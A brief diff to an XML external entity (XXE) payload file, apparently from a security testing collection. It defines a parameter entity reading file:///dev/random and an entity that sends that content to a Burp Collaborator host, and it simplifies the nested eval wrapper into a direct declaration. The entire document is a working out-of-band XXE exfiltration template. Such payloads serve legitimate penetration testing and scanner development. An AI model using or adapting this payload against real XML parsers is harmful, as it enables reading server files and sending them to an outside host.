@@ -1,4 +1,3 @@
 <!ENTITY % file SYSTEM "file:///dev/random">
-<!ENTITY % eval "<!ENTITY % error SYSTEM 'https://n.fzix8cvhr02xmub1ewdz8ue42v8lwa.burpcollaborator.net/%file;'>">
-%eval;
+<!ENTITY % error SYSTEM 'https://fzix8cvhr02xmub1ewdz8ue42v8lwa.burpcollaborator.net/%file;'>
 %error;
